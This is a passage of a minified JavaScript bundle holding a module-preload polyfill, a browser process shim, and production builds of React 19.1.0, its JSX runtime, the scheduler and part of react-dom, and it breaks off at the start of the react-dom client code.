var Kp = Object.defineProperty;
var Xp = (_, M, j) => M in _ ? Kp(_, M, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: j
}) : _[M] = j;
var vi = (_, M, j) => Xp(_, typeof M != "symbol" ? M + "" : M, j);
function _mergeNamespaces(_, M) {
    for (var j = 0; j < M.length; j++) {
        const O = M[j];
        if (typeof O != "string" && !Array.isArray(O)) {
            for (const x in O)
                if (x !== "default" && !(x in _)) {
                    const w = Object.getOwnPropertyDescriptor(O, x);
                    w && Object.defineProperty(_, x, w.get ? w : {
                        enumerable: !0,
                        get: () => O[x]
                    })
                }
        }
    }
    return Object.freeze(Object.defineProperty(_, Symbol.toStringTag, {
        value: "Module"
    }))
}
(function() {
    const M = document.createElement("link").relList;
    if (M && M.supports && M.supports("modulepreload"))
        return;
    for (const x of document.querySelectorAll('link[rel="modulepreload"]'))
        O(x);
    new MutationObserver(x => {
        for (const w of x)
            if (w.type === "childList")
                for (const b of w.addedNodes)
                    b.tagName === "LINK" && b.rel === "modulepreload" && O(b)
    }
    ).observe(document, {
        childList: !0,
        subtree: !0
    });
    function j(x) {
        const w = {};
        return x.integrity && (w.integrity = x.integrity),
        x.referrerPolicy && (w.referrerPolicy = x.referrerPolicy),
        x.crossOrigin === "use-credentials" ? w.credentials = "include" : x.crossOrigin === "anonymous" ? w.credentials = "omit" : w.credentials = "same-origin",
        w
    }
    function O(x) {
        if (x.ep)
            return;
        x.ep = !0;
        const w = j(x);
        fetch(x.href, w)
    }
}
)();
function getDefaultExportFromCjs$1(_) {
    return _ && _.__esModule && Object.prototype.hasOwnProperty.call(_, "default") ? _.default : _
}
function getAugmentedNamespace(_) {
    if (Object.prototype.hasOwnProperty.call(_, "__esModule"))
        return _;
    var M = _.default;
    if (typeof M == "function") {
        var j = function O() {
            return this instanceof O ? Reflect.construct(M, arguments, this.constructor) : M.apply(this, arguments)
        };
        j.prototype = M.prototype
    } else
        j = {};
    return Object.defineProperty(j, "__esModule", {
        value: !0
    }),
    Object.keys(_).forEach(function(O) {
        var x = Object.getOwnPropertyDescriptor(_, O);
        Object.defineProperty(j, O, x.get ? x : {
            enumerable: !0,
            get: function() {
                return _[O]
            }
        })
    }),
    j
}
var jsxRuntime = {
    exports: {}
}
  , reactJsxRuntime_production = {};
/**
 * @license React
 * react-jsx-runtime.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var hasRequiredReactJsxRuntime_production;
function requireReactJsxRuntime_production() {
    if (hasRequiredReactJsxRuntime_production)
        return reactJsxRuntime_production;
    hasRequiredReactJsxRuntime_production = 1;
    var _ = Symbol.for("react.transitional.element")
      , M = Symbol.for("react.fragment");
    function j(O, x, w) {
        var b = null;
        if (w !== void 0 && (b = "" + w),
        x.key !== void 0 && (b = "" + x.key),
        "key"in x) {
            w = {};
            for (var X in x)
                X !== "key" && (w[X] = x[X])
        } else
            w = x;
        return x = w.ref,
        {
            $$typeof: _,
            type: O,
            key: b,
            ref: x !== void 0 ? x : null,
            props: w
        }
    }
    return reactJsxRuntime_production.Fragment = M,
    reactJsxRuntime_production.jsx = j,
    reactJsxRuntime_production.jsxs = j,
    reactJsxRuntime_production
}
var hasRequiredJsxRuntime;
function requireJsxRuntime() {
    return hasRequiredJsxRuntime || (hasRequiredJsxRuntime = 1,
    jsxRuntime.exports = requireReactJsxRuntime_production()),
    jsxRuntime.exports
}
var jsxRuntimeExports = requireJsxRuntime()
  , react = {
    exports: {}
};
function getDefaultExportFromCjs(_) {
    return _ && _.__esModule && Object.prototype.hasOwnProperty.call(_, "default") ? _.default : _
}
var browser$f = {
    exports: {}
}, process = browser$f.exports = {}, cachedSetTimeout, cachedClearTimeout;
function defaultSetTimout() {
    throw new Error("setTimeout has not been defined")
}
function defaultClearTimeout() {
    throw new Error("clearTimeout has not been defined")
}
(function() {
    try {
        typeof setTimeout == "function" ? cachedSetTimeout = setTimeout : cachedSetTimeout = defaultSetTimout
    } catch {
        cachedSetTimeout = defaultSetTimout
    }
    try {
        typeof clearTimeout == "function" ? cachedClearTimeout = clearTimeout : cachedClearTimeout = defaultClearTimeout
    } catch {
        cachedClearTimeout = defaultClearTimeout
    }
}
)();
function runTimeout(_) {
    if (cachedSetTimeout === setTimeout)
        return setTimeout(_, 0);
    if ((cachedSetTimeout === defaultSetTimout || !cachedSetTimeout) && setTimeout)
        return cachedSetTimeout = setTimeout,
        setTimeout(_, 0);
    try {
        return cachedSetTimeout(_, 0)
    } catch {
        try {
            return cachedSetTimeout.call(null, _, 0)
        } catch {
            return cachedSetTimeout.call(this, _, 0)
        }
    }
}
function runClearTimeout(_) {
    if (cachedClearTimeout === clearTimeout)
        return clearTimeout(_);
    if ((cachedClearTimeout === defaultClearTimeout || !cachedClearTimeout) && clearTimeout)
        return cachedClearTimeout = clearTimeout,
        clearTimeout(_);
    try {
        return cachedClearTimeout(_)
    } catch {
        try {
            return cachedClearTimeout.call(null, _)
        } catch {
            return cachedClearTimeout.call(this, _)
        }
    }
}
var queue = [], draining = !1, currentQueue, queueIndex = -1;
function cleanUpNextTick() {
    !draining || !currentQueue || (draining = !1,
    currentQueue.length ? queue = currentQueue.concat(queue) : queueIndex = -1,
    queue.length && drainQueue())
}
function drainQueue() {
    if (!draining) {
        var _ = runTimeout(cleanUpNextTick);
        draining = !0;
        for (var M = queue.length; M; ) {
            for (currentQueue = queue,
            queue = []; ++queueIndex < M; )
                currentQueue && currentQueue[queueIndex].run();
            queueIndex = -1,
            M = queue.length
        }
        currentQueue = null,
        draining = !1,
        runClearTimeout(_)
    }
}
process.nextTick = function(_) {
    var M = new Array(arguments.length - 1);
    if (arguments.length > 1)
        for (var j = 1; j < arguments.length; j++)
            M[j - 1] = arguments[j];
    queue.push(new Item$2(_,M)),
    queue.length === 1 && !draining && runTimeout(drainQueue)
}
;
function Item$2(_, M) {
    this.fun = _,
    this.array = M
}
Item$2.prototype.run = function() {
    this.fun.apply(null, this.array)
}
;
process.title = "browser";
process.browser = !0;
process.env = {};
process.argv = [];
process.version = "";
process.versions = {};
function noop$1() {}
process.on = noop$1;
process.addListener = noop$1;
process.once = noop$1;
process.off = noop$1;
process.removeListener = noop$1;
process.removeAllListeners = noop$1;
process.emit = noop$1;
process.prependListener = noop$1;
process.prependOnceListener = noop$1;
process.listeners = function(_) {
    return []
}
;
process.binding = function(_) {
    throw new Error("process.binding is not supported")
}
;
process.cwd = function() {
    return "/"
}
;
process.chdir = function(_) {
    throw new Error("process.chdir is not supported")
}
;
process.umask = function() {
    return 0
}
;
var browserExports = browser$f.exports;
const process$1 = getDefaultExportFromCjs(browserExports);
var react_production = {}, hasRequiredReact_production;
function requireReact_production() {
    if (hasRequiredReact_production)
        return react_production;
    hasRequiredReact_production = 1;
    var _ = Symbol.for("react.transitional.element")
      , M = Symbol.for("react.portal")
      , j = Symbol.for("react.fragment")
      , O = Symbol.for("react.strict_mode")
      , x = Symbol.for("react.profiler")
      , w = Symbol.for("react.consumer")
      , b = Symbol.for("react.context")
      , X = Symbol.for("react.forward_ref")
      , Y = Symbol.for("react.suspense")
      , F = Symbol.for("react.memo")
      , V = Symbol.for("react.lazy")
      , K = Symbol.iterator;
    function Q($) {
        return $ === null || typeof $ != "object" ? null : ($ = K && $[K] || $["@@iterator"],
        typeof $ == "function" ? $ : null)
    }
    var ee = {
        isMounted: function() {
            return !1
        },
        enqueueForceUpdate: function() {},
        enqueueReplaceState: function() {},
        enqueueSetState: function() {}
    }
      , ae = Object.assign
      , ne = {};
    function oe($, ie, ve) {
        this.props = $,
        this.context = ie,
        this.refs = ne,
        this.updater = ve || ee
    }
    oe.prototype.isReactComponent = {},
    oe.prototype.setState = function($, ie) {
        if (typeof $ != "object" && typeof $ != "function" && $ != null)
            throw Error("takes an object of state variables to update or a function which returns an object of state variables.");
        this.updater.enqueueSetState(this, $, ie, "setState")
    }
    ,
    oe.prototype.forceUpdate = function($) {
        this.updater.enqueueForceUpdate(this, $, "forceUpdate")
    }
    ;
    function ue() {}
    ue.prototype = oe.prototype;
    function fe($, ie, ve) {
        this.props = $,
        this.context = ie,
        this.refs = ne,
        this.updater = ve || ee
    }
    var he = fe.prototype = new ue;
    he.constructor = fe,
    ae(he, oe.prototype),
    he.isPureReactComponent = !0;
    var pe = Array.isArray
      , ye = {
        H: null,
        A: null,
        T: null,
        S: null,
        V: null
    }
      , be = Object.prototype.hasOwnProperty;
    function xe($, ie, ve, ge, Re, Pe) {
        return ve = Pe.ref,
        {
            $$typeof: _,
            type: $,
            key: ie,
            ref: ve !== void 0 ? ve : null,
            props: Pe
        }
    }
    function Ae($, ie) {
        return xe($.type, ie, void 0, void 0, void 0, $.props)
    }
    function Ee($) {
        return typeof $ == "object" && $ !== null && $.$$typeof === _
    }
    function Be($) {
        var ie = {
            "=": "=0",
            ":": "=2"
        };
        return "$" + $.replace(/[=:]/g, function(ve) {
            return ie[ve]
        })
    }
    var ce = /\/+/g;
    function q($, ie) {
        return typeof $ == "object" && $ !== null && $.key != null ? Be("" + $.key) : ie.toString(36)
    }
    function L() {}
    function U($) {
        switch ($.status) {
        case "fulfilled":
            return $.value;
        case "rejected":
            throw $.reason;
        default:
            switch (typeof $.status == "string" ? $.then(L, L) : ($.status = "pending",
            $.then(function(ie) {
                $.status === "pending" && ($.status = "fulfilled",
                $.value = ie)
            }, function(ie) {
                $.status === "pending" && ($.status = "rejected",
                $.reason = ie)
            })),
            $.status) {
            case "fulfilled":
                return $.value;
            case "rejected":
                throw $.reason
            }
        }
        throw $
    }
    function Z($, ie, ve, ge, Re) {
        var Pe = typeof $;
        (Pe === "undefined" || Pe === "boolean") && ($ = null);
        var Ie = !1;
        if ($ === null)
            Ie = !0;
        else
            switch (Pe) {
            case "bigint":
            case "string":
            case "number":
                Ie = !0;
                break;
            case "object":
                switch ($.$$typeof) {
                case _:
                case M:
                    Ie = !0;
                    break;
                case V:
                    return Ie = $._init,
                    Z(Ie($._payload), ie, ve, ge, Re)
                }
            }
        if (Ie)
            return Re = Re($),
            Ie = ge === "" ? "." + q($, 0) : ge,
            pe(Re) ? (ve = "",
            Ie != null && (ve = Ie.replace(ce, "$&/") + "/"),
            Z(Re, ie, ve, "", function(Ze) {
                return Ze
            })) : Re != null && (Ee(Re) && (Re = Ae(Re, ve + (Re.key == null || $ && $.key === Re.key ? "" : ("" + Re.key).replace(ce, "$&/") + "/") + Ie)),
            ie.push(Re)),
            1;
        Ie = 0;
        var Te = ge === "" ? "." : ge + ":";
        if (pe($))
            for (var Le = 0; Le < $.length; Le++)
                ge = $[Le],
                Pe = Te + q(ge, Le),
                Ie += Z(ge, ie, ve, Pe, Re);
        else if (Le = Q($),
        typeof Le == "function")
            for ($ = Le.call($),
            Le = 0; !(ge = $.next()).done; )
                ge = ge.value,
                Pe = Te + q(ge, Le++),
                Ie += Z(ge, ie, ve, Pe, Re);
        else if (Pe === "object") {
            if (typeof $.then == "function")
                return Z(U($), ie, ve, ge, Re);
            throw ie = String($),
            Error("Objects are not valid as a React child (found: " + (ie === "[object Object]" ? "object with keys {" + Object.keys($).join(", ") + "}" : ie) + "). If you meant to render a collection of children, use an array instead.")
        }
        return Ie
    }
    function te($, ie, ve) {
        if ($ == null)
            return $;
        var ge = []
          , Re = 0;
        return Z($, ge, "", "", function(Pe) {
            return ie.call(ve, Pe, Re++)
        }),
        ge
    }
    function se($) {
        if ($._status === -1) {
            var ie = $._result;
            ie = ie(),
            ie.then(function(ve) {
                ($._status === 0 || $._status === -1) && ($._status = 1,
                $._result = ve)
            }, function(ve) {
                ($._status === 0 || $._status === -1) && ($._status = 2,
                $._result = ve)
            }),
            $._status === -1 && ($._status = 0,
            $._result = ie)
        }
        if ($._status === 1)
            return $._result.default;
        throw $._result
    }
    var de = typeof reportError == "function" ? reportError : function($) {
        if (typeof window == "object" && typeof window.ErrorEvent == "function") {
            var ie = new window.ErrorEvent("error",{
                bubbles: !0,
                cancelable: !0,
                message: typeof $ == "object" && $ !== null && typeof $.message == "string" ? String($.message) : String($),
                error: $
            });
            if (!window.dispatchEvent(ie))
                return
        } else if (typeof process$1 == "object" && typeof process$1.emit == "function") {
            process$1.emit("uncaughtException", $);
            return
        }
        console.error($)
    }
    ;
    function re() {}
    return react_production.Children = {
        map: te,
        forEach: function($, ie, ve) {
            te($, function() {
                ie.apply(this, arguments)
            }, ve)
        },
        count: function($) {
            var ie = 0;
            return te($, function() {
                ie++
            }),
            ie
        },
        toArray: function($) {
            return te($, function(ie) {
                return ie
            }) || []
        },
        only: function($) {
            if (!Ee($))
                throw Error("React.Children.only expected to receive a single React element child.");
            return $
        }
    },
    react_production.Component = oe,
    react_production.Fragment = j,
    react_production.Profiler = x,
    react_production.PureComponent = fe,
    react_production.StrictMode = O,
    react_production.Suspense = Y,
    react_production.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE = ye,
    react_production.__COMPILER_RUNTIME = {
        __proto__: null,
        c: function($) {
            return ye.H.useMemoCache($)
        }
    },
    react_production.cache = function($) {
        return function() {
            return $.apply(null, arguments)
        }
    }
    ,
    react_production.cloneElement = function($, ie, ve) {
        if ($ == null)
            throw Error("The argument must be a React element, but you passed " + $ + ".");
        var ge = ae({}, $.props)
          , Re = $.key
          , Pe = void 0;
        if (ie != null)
            for (Ie in ie.ref !== void 0 && (Pe = void 0),
            ie.key !== void 0 && (Re = "" + ie.key),
            ie)
                !be.call(ie, Ie) || Ie === "key" || Ie === "__self" || Ie === "__source" || Ie === "ref" && ie.ref === void 0 || (ge[Ie] = ie[Ie]);
        var Ie = arguments.length - 2;
        if (Ie === 1)
            ge.children = ve;
        else if (1 < Ie) {
            for (var Te = Array(Ie), Le = 0; Le < Ie; Le++)
                Te[Le] = arguments[Le + 2];
            ge.children = Te
        }
        return xe($.type, Re, void 0, void 0, Pe, ge)
    }
    ,
    react_production.createContext = function($) {
        return $ = {
            $$typeof: b,
            _currentValue: $,
            _currentValue2: $,
            _threadCount: 0,
            Provider: null,
            Consumer: null
        },
        $.Provider = $,
        $.Consumer = {
            $$typeof: w,
            _context: $
        },
        $
    }
    ,
    react_production.createElement = function($, ie, ve) {
        var ge, Re = {}, Pe = null;
        if (ie != null)
            for (ge in ie.key !== void 0 && (Pe = "" + ie.key),
            ie)
                be.call(ie, ge) && ge !== "key" && ge !== "__self" && ge !== "__source" && (Re[ge] = ie[ge]);
        var Ie = arguments.length - 2;
        if (Ie === 1)
            Re.children = ve;
        else if (1 < Ie) {
            for (var Te = Array(Ie), Le = 0; Le < Ie; Le++)
                Te[Le] = arguments[Le + 2];
            Re.children = Te
        }
        if ($ && $.defaultProps)
            for (ge in Ie = $.defaultProps,
            Ie)
                Re[ge] === void 0 && (Re[ge] = Ie[ge]);
        return xe($, Pe, void 0, void 0, null, Re)
    }
    ,
    react_production.createRef = function() {
        return {
            current: null
        }
    }
    ,
    react_production.forwardRef = function($) {
        return {
            $$typeof: X,
            render: $
        }
    }
    ,
    react_production.isValidElement = Ee,
    react_production.lazy = function($) {
        return {
            $$typeof: V,
            _payload: {
                _status: -1,
                _result: $
            },
            _init: se
        }
    }
    ,
    react_production.memo = function($, ie) {
        return {
            $$typeof: F,
            type: $,
            compare: ie === void 0 ? null : ie
        }
    }
    ,
    react_production.startTransition = function($) {
        var ie = ye.T
          , ve = {};
        ye.T = ve;
        try {
            var ge = $()
              , Re = ye.S;
            Re !== null && Re(ve, ge),
            typeof ge == "object" && ge !== null && typeof ge.then == "function" && ge.then(re, de)
        } catch (Pe) {
            de(Pe)
        } finally {
            ye.T = ie
        }
    }
    ,
    react_production.unstable_useCacheRefresh = function() {
        return ye.H.useCacheRefresh()
    }
    ,
    react_production.use = function($) {
        return ye.H.use($)
    }
    ,
    react_production.useActionState = function($, ie, ve) {
        return ye.H.useActionState($, ie, ve)
    }
    ,
    react_production.useCallback = function($, ie) {
        return ye.H.useCallback($, ie)
    }
    ,
    react_production.useContext = function($) {
        return ye.H.useContext($)
    }
    ,
    react_production.useDebugValue = function() {}
    ,
    react_production.useDeferredValue = function($, ie) {
        return ye.H.useDeferredValue($, ie)
    }
    ,
    react_production.useEffect = function($, ie, ve) {
        var ge = ye.H;
        if (typeof ve == "function")
            throw Error("useEffect CRUD overload is not enabled in this build of React.");
        return ge.useEffect($, ie)
    }
    ,
    react_production.useId = function() {
        return ye.H.useId()
    }
    ,
    react_production.useImperativeHandle = function($, ie, ve) {
        return ye.H.useImperativeHandle($, ie, ve)
    }
    ,
    react_production.useInsertionEffect = function($, ie) {
        return ye.H.useInsertionEffect($, ie)
    }
    ,
    react_production.useLayoutEffect = function($, ie) {
        return ye.H.useLayoutEffect($, ie)
    }
    ,
    react_production.useMemo = function($, ie) {
        return ye.H.useMemo($, ie)
    }
    ,
    react_production.useOptimistic = function($, ie) {
        return ye.H.useOptimistic($, ie)
    }
    ,
    react_production.useReducer = function($, ie, ve) {
        return ye.H.useReducer($, ie, ve)
    }
    ,
    react_production.useRef = function($) {
        return ye.H.useRef($)
    }
    ,
    react_production.useState = function($) {
        return ye.H.useState($)
    }
    ,
    react_production.useSyncExternalStore = function($, ie, ve) {
        return ye.H.useSyncExternalStore($, ie, ve)
    }
    ,
    react_production.useTransition = function() {
        return ye.H.useTransition()
    }
    ,
    react_production.version = "19.1.0",
    react_production
}
var hasRequiredReact;
function requireReact() {
    return hasRequiredReact || (hasRequiredReact = 1,
    react.exports = requireReact_production()),
    react.exports
}
var reactExports = requireReact();
const React = getDefaultExportFromCjs$1(reactExports)
  , React$1 = _mergeNamespaces({
    __proto__: null,
    default: React
}, [reactExports]);
var client = {
    exports: {}
}
  , reactDomClient_production = {}
  , scheduler = {
    exports: {}
}
  , scheduler_production = {};
/**
 * @license React
 * scheduler.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var hasRequiredScheduler_production;
function requireScheduler_production() {
    return hasRequiredScheduler_production || (hasRequiredScheduler_production = 1,
    function(_) {
        function M(te, se) {
            var de = te.length;
            te.push(se);
            e: for (; 0 < de; ) {
                var re = de - 1 >>> 1
                  , $ = te[re];
                if (0 < x($, se))
                    te[re] = se,
                    te[de] = $,
                    de = re;
                else
                    break e
            }
        }
        function j(te) {
            return te.length === 0 ? null : te[0]
        }
        function O(te) {
            if (te.length === 0)
                return null;
            var se = te[0]
              , de = te.pop();
            if (de !== se) {
                te[0] = de;
                e: for (var re = 0, $ = te.length, ie = $ >>> 1; re < ie; ) {
                    var ve = 2 * (re + 1) - 1
                      , ge = te[ve]
                      , Re = ve + 1
                      , Pe = te[Re];
                    if (0 > x(ge, de))
                        Re < $ && 0 > x(Pe, ge) ? (te[re] = Pe,
                        te[Re] = de,
                        re = Re) : (te[re] = ge,
                        te[ve] = de,
                        re = ve);
                    else if (Re < $ && 0 > x(Pe, de))
                        te[re] = Pe,
                        te[Re] = de,
                        re = Re;
                    else
                        break e
                }
            }
            return se
        }
        function x(te, se) {
            var de = te.sortIndex - se.sortIndex;
            return de !== 0 ? de : te.id - se.id
        }
        if (_.unstable_now = void 0,
        typeof performance == "object" && typeof performance.now == "function") {
            var w = performance;
            _.unstable_now = function() {
                return w.now()
            }
        } else {
            var b = Date
              , X = b.now();
            _.unstable_now = function() {
                return b.now() - X
            }
        }
        var Y = []
          , F = []
          , V = 1
          , K = null
          , Q = 3
          , ee = !1
          , ae = !1
          , ne = !1
          , oe = !1
          , ue = typeof setTimeout == "function" ? setTimeout : null
          , fe = typeof clearTimeout == "function" ? clearTimeout : null
          , he = typeof setImmediate < "u" ? setImmediate : null;
        function pe(te) {
            for (var se = j(F); se !== null; ) {
                if (se.callback === null)
                    O(F);
                else if (se.startTime <= te)
                    O(F),
                    se.sortIndex = se.expirationTime,
                    M(Y, se);
                else
                    break;
                se = j(F)
            }
        }
        function ye(te) {
            if (ne = !1,
            pe(te),
            !ae)
                if (j(Y) !== null)
                    ae = !0,
                    be || (be = !0,
                    q());
                else {
                    var se = j(F);
                    se !== null && Z(ye, se.startTime - te)
                }
        }
        var be = !1
          , xe = -1
          , Ae = 5
          , Ee = -1;
        function Be() {
            return oe ? !0 : !(_.unstable_now() - Ee < Ae)
        }
        function ce() {
            if (oe = !1,
            be) {
                var te = _.unstable_now();
                Ee = te;
                var se = !0;
                try {
                    e: {
                        ae = !1,
                        ne && (ne = !1,
                        fe(xe),
                        xe = -1),
                        ee = !0;
                        var de = Q;
                        try {
                            t: {
                                for (pe(te),
                                K = j(Y); K !== null && !(K.expirationTime > te && Be()); ) {
                                    var re = K.callback;
                                    if (typeof re == "function") {
                                        K.callback = null,
                                        Q = K.priorityLevel;
                                        var $ = re(K.expirationTime <= te);
                                        if (te = _.unstable_now(),
                                        typeof $ == "function") {
                                            K.callback = $,
                                            pe(te),
                                            se = !0;
                                            break t
                                        }
                                        K === j(Y) && O(Y),
                                        pe(te)
                                    } else
                                        O(Y);
                                    K = j(Y)
                                }
                                if (K !== null)
                                    se = !0;
                                else {
                                    var ie = j(F);
                                    ie !== null && Z(ye, ie.startTime - te),
                                    se = !1
                                }
                            }
                            break e
                        } finally {
                            K = null,
                            Q = de,
                            ee = !1
                        }
                        se = void 0
                    }
                } finally {
                    se ? q() : be = !1
                }
            }
        }
        var q;
        if (typeof he == "function")
            q = function() {
                he(ce)
            }
            ;
        else if (typeof MessageChannel < "u") {
            var L = new MessageChannel
              , U = L.port2;
            L.port1.onmessage = ce,
            q = function() {
                U.postMessage(null)
            }
        } else
            q = function() {
                ue(ce, 0)
            }
            ;
        function Z(te, se) {
            xe = ue(function() {
                te(_.unstable_now())
            }, se)
        }
        _.unstable_IdlePriority = 5,
        _.unstable_ImmediatePriority = 1,
        _.unstable_LowPriority = 4,
        _.unstable_NormalPriority = 3,
        _.unstable_Profiling = null,
        _.unstable_UserBlockingPriority = 2,
        _.unstable_cancelCallback = function(te) {
            te.callback = null
        }
        ,
        _.unstable_forceFrameRate = function(te) {
            0 > te || 125 < te ? console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported") : Ae = 0 < te ? Math.floor(1e3 / te) : 5
        }
        ,
        _.unstable_getCurrentPriorityLevel = function() {
            return Q
        }
        ,
        _.unstable_next = function(te) {
            switch (Q) {
            case 1:
            case 2:
            case 3:
                var se = 3;
                break;
            default:
                se = Q
            }
            var de = Q;
            Q = se;
            try {
                return te()
            } finally {
                Q = de
            }
        }
        ,
        _.unstable_requestPaint = function() {
            oe = !0
        }
        ,
        _.unstable_runWithPriority = function(te, se) {
            switch (te) {
            case 1:
            case 2:
            case 3:
            case 4:
            case 5:
                break;
            default:
                te = 3
            }
            var de = Q;
            Q = te;
            try {
                return se()
            } finally {
                Q = de
            }
        }
        ,
        _.unstable_scheduleCallback = function(te, se, de) {
            var re = _.unstable_now();
            switch (typeof de == "object" && de !== null ? (de = de.delay,
            de = typeof de == "number" && 0 < de ? re + de : re) : de = re,
            te) {
            case 1:
                var $ = -1;
                break;
            case 2:
                $ = 250;
                break;
            case 5:
                $ = 1073741823;
                break;
            case 4:
                $ = 1e4;
                break;
            default:
                $ = 5e3
            }
            return $ = de + $,
            te = {
                id: V++,
                callback: se,
                priorityLevel: te,
                startTime: de,
                expirationTime: $,
                sortIndex: -1
            },
            de > re ? (te.sortIndex = de,
            M(F, te),
            j(Y) === null && te === j(F) && (ne ? (fe(xe),
            xe = -1) : ne = !0,
            Z(ye, de - re))) : (te.sortIndex = $,
            M(Y, te),
            ae || ee || (ae = !0,
            be || (be = !0,
            q()))),
            te
        }
        ,
        _.unstable_shouldYield = Be,
        _.unstable_wrapCallback = function(te) {
            var se = Q;
            return function() {
                var de = Q;
                Q = se;
                try {
                    return te.apply(this, arguments)
                } finally {
                    Q = de
                }
            }
        }
    }(scheduler_production)),
    scheduler_production
}
var hasRequiredScheduler;
function requireScheduler() {
    return hasRequiredScheduler || (hasRequiredScheduler = 1,
    scheduler.exports = requireScheduler_production()),
    scheduler.exports
}
var reactDom = {
    exports: {}
}
  , reactDom_production = {};
/**
 * @license React
 * react-dom.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var hasRequiredReactDom_production;
function requireReactDom_production() {
    if (hasRequiredReactDom_production)
        return reactDom_production;
    hasRequiredReactDom_production = 1;
    var _ = requireReact();
    function M(Y) {
        var F = "https://react.dev/errors/" + Y;
        if (1 < arguments.length) {
            F += "?args[]=" + encodeURIComponent(arguments[1]);
            for (var V = 2; V < arguments.length; V++)
                F += "&args[]=" + encodeURIComponent(arguments[V])
        }
        return "Minified React error #" + Y + "; visit " + F + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
    }
    function j() {}
    var O = {
        d: {
            f: j,
            r: function() {
                throw Error(M(522))
            },
            D: j,
            C: j,
            L: j,
            m: j,
            X: j,
            S: j,
            M: j
        },
        p: 0,
        findDOMNode: null
    }
      , x = Symbol.for("react.portal");
    function w(Y, F, V) {
        var K = 3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
        return {
            $$typeof: x,
            key: K == null ? null : "" + K,
            children: Y,
            containerInfo: F,
            implementation: V
        }
    }
    var b = _.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;
    function X(Y, F) {
        if (Y === "font")
            return "";
        if (typeof F == "string")
            return F === "use-credentials" ? F : ""
    }
    return reactDom_production.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE = O,
    reactDom_production.createPortal = function(Y, F) {
        var V = 2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
        if (!F || F.nodeType !== 1 && F.nodeType !== 9 && F.nodeType !== 11)
            throw Error(M(299));
        return w(Y, F, null, V)
    }
    ,
    reactDom_production.flushSync = function(Y) {
        var F = b.T
          , V = O.p;
        try {
            if (b.T = null,
            O.p = 2,
            Y)
                return Y()
        } finally {
            b.T = F,
            O.p = V,
            O.d.f()
        }
    }
    ,
    reactDom_production.preconnect = function(Y, F) {
        typeof Y == "string" && (F ? (F = F.crossOrigin,
        F = typeof F == "string" ? F === "use-credentials" ? F : "" : void 0) : F = null,
        O.d.C(Y, F))
    }
    ,
    reactDom_production.prefetchDNS = function(Y) {
        typeof Y == "string" && O.d.D(Y)
    }
    ,
    reactDom_production.preinit = function(Y, F) {
        if (typeof Y == "string" && F && typeof F.as == "string") {
            var V = F.as
              , K = X(V, F.crossOrigin)
              , Q = typeof F.integrity == "string" ? F.integrity : void 0
              , ee = typeof F.fetchPriority == "string" ? F.fetchPriority : void 0;
            V === "style" ? O.d.S(Y, typeof F.precedence == "string" ? F.precedence : void 0, {
                crossOrigin: K,
                integrity: Q,
                fetchPriority: ee
            }) : V === "script" && O.d.X(Y, {
                crossOrigin: K,
                integrity: Q,
                fetchPriority: ee,
                nonce: typeof F.nonce == "string" ? F.nonce : void 0
            })
        }
    }
    ,
    reactDom_production.preinitModule = function(Y, F) {
        if (typeof Y == "string")
            if (typeof F == "object" && F !== null) {
                if (F.as == null || F.as === "script") {
                    var V = X(F.as, F.crossOrigin);
                    O.d.M(Y, {
                        crossOrigin: V,
                        integrity: typeof F.integrity == "string" ? F.integrity : void 0,
                        nonce: typeof F.nonce == "string" ? F.nonce : void 0
                    })
                }
            } else
                F == null && O.d.M(Y)
    }
    ,
    reactDom_production.preload = function(Y, F) {
        if (typeof Y == "string" && typeof F == "object" && F !== null && typeof F.as == "string") {
            var V = F.as
              , K = X(V, F.crossOrigin);
            O.d.L(Y, V, {
                crossOrigin: K,
                integrity: typeof F.integrity == "string" ? F.integrity : void 0,
                nonce: typeof F.nonce == "string" ? F.nonce : void 0,
                type: typeof F.type == "string" ? F.type : void 0,
                fetchPriority: typeof F.fetchPriority == "string" ? F.fetchPriority : void 0,
                referrerPolicy: typeof F.referrerPolicy == "string" ? F.referrerPolicy : void 0,
                imageSrcSet: typeof F.imageSrcSet == "string" ? F.imageSrcSet : void 0,
                imageSizes: typeof F.imageSizes == "string" ? F.imageSizes : void 0,
                media: typeof F.media == "string" ? F.media : void 0
            })
        }
    }
    ,
    reactDom_production.preloadModule = function(Y, F) {
        if (typeof Y == "string")
            if (F) {
                var V = X(F.as, F.crossOrigin);
                O.d.m(Y, {
                    as: typeof F.as == "string" && F.as !== "script" ? F.as : void 0,
                    crossOrigin: V,
                    integrity: typeof F.integrity == "string" ? F.integrity : void 0
                })
            } else
                O.d.m(Y)
    }
    ,
    reactDom_production.requestFormReset = function(Y) {
        O.d.r(Y)
    }
    ,
    reactDom_production.unstable_batchedUpdates = function(Y, F) {
        return Y(F)
    }
    ,
    reactDom_production.useFormState = function(Y, F, V) {
        return b.H.useFormState(Y, F, V)
    }
    ,
    reactDom_production.useFormStatus = function() {
        return b.H.useHostTransitionStatus()
    }
    ,
    reactDom_production.version = "19.1.0",
    reactDom_production
}
var hasRequiredReactDom;
function requireReactDom() {
    if (hasRequiredReactDom)
        return reactDom.exports;
    hasRequiredReactDom = 1;
    function _() {
        if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"))
            try {
                __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(_)
            } catch (M) {
                console.error(M)
            }
    }
    return _(),
    reactDom.exports = requireReactDom_production(),
    reactDom.exports
}
var hasRequiredReactDomClient_production;
function requireReactDomClient_production() {
    if (hasRequiredReactDomClient_production)
        return reactDomClient_production;
    hasRequiredReactDomClient_production = 1;
    /**
